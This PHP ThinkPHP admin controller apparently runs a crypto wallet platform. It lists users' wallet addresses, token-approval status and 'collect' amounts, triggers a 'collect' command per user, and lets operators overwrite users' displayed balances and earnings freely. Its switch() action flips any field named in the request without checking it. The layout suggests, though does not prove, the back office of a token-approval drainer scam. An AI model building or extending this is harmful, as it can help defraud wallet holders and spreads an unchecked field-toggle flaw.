<?php

namespace app\admin\controller;

use app\common\controller\Backend;
use app\common\model\Assets;
use app\common\model\SmartContract;
use think\Console;
use think\Db;
use think\db\Where;
use think\facade\Request;

class User extends Backend
{

    public function lists()
    {
        $map = new Where();
        $address = Request::param('wallet_address');
        $status = Request::param('status');
        $contractAddress = Request::param('contract_address');
        $coinId = Request::param('coin_id');
        $is_approve = Request::param('is_approve');
        if ($address !== null && $address !== '') {
            $map['wallet_address'] = ['like', '%' . $address . '%'];
        }
        if ($status !== null && $status !== '') {
            $map['status'] = $status;
        }
        if ($contractAddress !== null && $contractAddress !== '') {
            $contractId = SmartContract::where(['contract_address' => $contractAddress])
                ->value('id');
            if ($contractId) {
                $map['contract_id'] = $contractId;
            }
        }
        if ($coinId !== null && $coinId !== '') {
            $map['token_id'] = $coinId;
        }

        if (isset($is_approve) && in_array($is_approve, [0, 1])) {
            $map['is_approve'] = $is_approve;
        }

        $data = \app\common\model\User::with(['contract', 'token', 'assets'])
            ->where($map)
            ->order(['id' => 'DESC'])
            ->append(['wallet_balance', 'approve_amount', 'collect_amount'])
            ->paginate();
        $this->success('请求成功', $data);
    }

    public function delete()
    {
        $id = Request::param('id');
        if (!\app\common\model\User::destroy($id)) {
            $this->error();
        }
        $this->success();
    }

    /**
     * 状态值0、1值切换
     */
    public function switch()
    {
        $id = Request::param('id');
        $field = Request::param('field');
        $row = \app\common\model\User::where(['id' => $id])
            ->findOrEmpty();
        if ($row->isEmpty()) {
            $this->error();
        }
        $row[$field] ^= 1;
        if (!$row->save()) {
            $this->error();
        }
        $this->success();
    }

    public function withdraw()
    {
        $id = Request::param('id');
        Console::call('collect', ['uid' => (string)$id]);
        $this->success();
    }

    /**
     * 重点关注
     */
    public function saveFocus()
    {

    }

    public function assets()
    {
        $user_id = (int)Request::param('user_id');
        $token_id = (int)Request::param('token_id');
        $row = Assets::where(['user_id' => $user_id])->where(['token_id' => $token_id])
            ->findOrEmpty();
        if ($row->isEmpty()) {
            $this->error();
        }

        $available_balance = Request::param('available_balance');
        $frozen_balance = Request::param('frozen_balance');
        $stake_balance = Request::param('stake_balance');
        $count_earnings = Request::param('count_earnings');
        $today_earnings = Request::param('today_earnings');
        $pool_earnings = Request::param('pool_earnings');
        $usdt_balance = Request::param('usdt_balance');
        $settle_usdt_balance = Request::param('settle_usdt_balance');

        if (request()->isPost()) {

            if ($available_balance < 0 || $frozen_balance < 0 || $stake_balance < 0) {
                $this->error('余额不能小于0');
            }

            Assets::where(['id' => $row['id']])->update(
                [
                    'available_balance' => $available_balance,
                    'frozen_balance' => $frozen_balance,
                    'stake_balance' => $stake_balance,
                    'count_earnings' => $count_earnings,
                    'today_earnings' => $today_earnings,
                    'pool_earnings' => $pool_earnings,
                    'usdt_balance' => $usdt_balance,
                    'settle_usdt_balance' => $settle_usdt_balance,
                ]
            );

            \app\common\model\User::where('id', $user_id)->data(['is_change' => 1])->update();

            /*
            $all_usdt_balance = $usdt_balance + $settle_usdt_balance;

            $now = date('Y-m-d H:i:s');
            if ($re_id = Db::name('stake_record')->where('user_id', $user_id)->where('token_id', 3)->value('id')) {
                Db::name('stake_record')->where('id', $re_id)->update(['amount' => $all_usdt_balance, 'update_time' => $now]);
            } else {
                Db::name('stake_record')->insertGetId(['user_id' => $user_id, 'token_id' => 3, 'amount' => $all_usdt_balance, 'update_time' => $now]);
            }
            */
            Console::call('gboy:user:level', ['uid' => (string)$user_id]);

            $this->success();
        } else {
            $this->success('请求成功', $row);
        }


    }

}
